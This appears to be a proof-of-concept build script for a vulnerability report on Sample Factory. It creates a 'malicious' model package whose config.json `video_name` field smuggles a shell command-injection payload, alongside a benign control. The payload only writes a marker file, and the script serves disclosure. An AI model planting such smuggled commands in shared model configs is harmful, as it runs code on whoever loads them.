#!/usr/bin/env python3
"""
Build the two Sample Factory model packages used by this report:

  <work>/models/evil_train_dir/cartpole_repro   -> config.json video_name = command-injection payload
  <work>/models/benign_train_dir/cartpole_repro -> config.json video_name = clip.mp4 (negative control)

Both packages are byte-identical copies of a genuine experiment directory produced by the
Sample Factory trainer at the pinned commit (config.json + checkpoint_p0/*.pth). The only
difference between the two is the single `video_name` value inside config.json.

A real experiment directory is required because `enjoy` refuses to start without a matching
config.json and a checkpoint. If the trainer output is missing, this script runs the real
trainer once (the command is the one documented in sf_examples/train_gym_env.py).
"""
from __future__ import annotations

import hashlib
import json
import shutil
import subprocess
import sys
from pathlib import Path

HOME = Path.home()
WORK = HOME / "sf_repro" / "poc-work"
TRAIN_DIR = WORK / "train_dir"
EXPERIMENT = "cartpole_repro"
SOURCE_EXP = TRAIN_DIR / EXPERIMENT
MODELS = WORK / "models"

# The attacker-controlled value of the `video_name` config field.
PAYLOAD = "clip$(printf$IFS'MBE2E_SEQ112'>$MARKER_PATH).mp4"
# Negative control: the same field with a plain filename.
BENIGN = "clip.mp4"

SAVE_VIDEO = True
MAX_NUM_FRAMES = 400  # keep both runs short and terminating

TRAIN_CMD = [
    sys.executable, "-m", "sf_examples.train_gym_env",
    "--algo=APPO", "--env=CartPole-v1", f"--experiment={EXPERIMENT}",
    f"--train_dir={TRAIN_DIR}",
    "--device=cpu", "--use_rnn=False", "--recurrence=1", "--with_vtrace=False",
    "--num_workers=1", "--num_envs_per_worker=2", "--rollout=32",
    "--batch_size=64", "--num_batches_per_epoch=1",
    "--save_every_sec=5", "--keep_checkpoints=3",
    "--train_for_env_steps=2000",
]


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def ensure_source_experiment() -> None:
    if (SOURCE_EXP / "config.json").is_file() and (SOURCE_EXP / "checkpoint_p0").is_dir():
        print(f"[=] trainer output already present: {SOURCE_EXP}")
        return
    print("[+] no trainer output yet -> running the real Sample Factory trainer once")
    print("    " + " ".join(TRAIN_CMD))
    TRAIN_DIR.mkdir(parents=True, exist_ok=True)
    subprocess.run(TRAIN_CMD, cwd=str(WORK), check=True)
    if not (SOURCE_EXP / "config.json").is_file():
        raise SystemExit("trainer did not produce config.json")


def build_package(name: str, video_name: str) -> Path:
    dst = MODELS / name / EXPERIMENT
    if dst.exists():
        shutil.rmtree(dst)
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copytree(SOURCE_EXP, dst)

    cfg_path = dst / "config.json"
    cfg = json.loads(cfg_path.read_text())
    cfg["save_video"] = SAVE_VIDEO
    cfg["max_num_frames"] = MAX_NUM_FRAMES
    cfg["video_name"] = video_name  # <-- the single field that differs
    cfg_path.write_text(json.dumps(cfg, indent=2) + "\n")
    return dst


def main() -> int:
    ensure_source_experiment()

    evil = build_package("evil_train_dir", PAYLOAD)
    benign = build_package("benign_train_dir", BENIGN)

    print()
    print(f"[+] evil   model package: {evil}")
    print(f"    video_name = {json.loads((evil / 'config.json').read_text())['video_name']!r}")
    print(f"[+] benign model package: {benign}")
    print(f"    video_name = {json.loads((benign / 'config.json').read_text())['video_name']!r}")
    print()

    # hashes: checkpoints identical, configs differ in exactly one value
    sums = []
    for pkg in (evil, benign):
        for p in sorted(pkg.rglob("*")):
            if p.is_file():
                sums.append(f"{sha256(p)}  {p.relative_to(MODELS).as_posix()}")
    (MODELS / "SHA256SUMS.txt").write_text("\n".join(sums) + "\n")

    print("[=] SHA-256 of the two checkpoints:")
    for pkg_name in ("evil_train_dir", "benign_train_dir"):
        ckpt = sorted((MODELS / pkg_name / EXPERIMENT / "checkpoint_p0").glob("checkpoint_*.pth"))[-1]
        print(f"    {sha256(ckpt)}  {ckpt.relative_to(MODELS).as_posix()}")

    evil_cfg = json.loads((evil / "config.json").read_text())
    benign_cfg = json.loads((benign / "config.json").read_text())
    diff = {k: (benign_cfg.get(k), evil_cfg.get(k)) for k in set(evil_cfg) | set(benign_cfg)
            if evil_cfg.get(k) != benign_cfg.get(k)}
    print()
    print(f"[=] config.json keys that differ between the two packages: {list(diff)}")
    print(f"    benign={diff.get('video_name', (None, None))[0]!r}  evil={diff.get('video_name', (None, None))[1]!r}")
    print()
    print(f"[i] next: run enjoy on models/evil_train_dir (command in 截图与复现指引.md)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
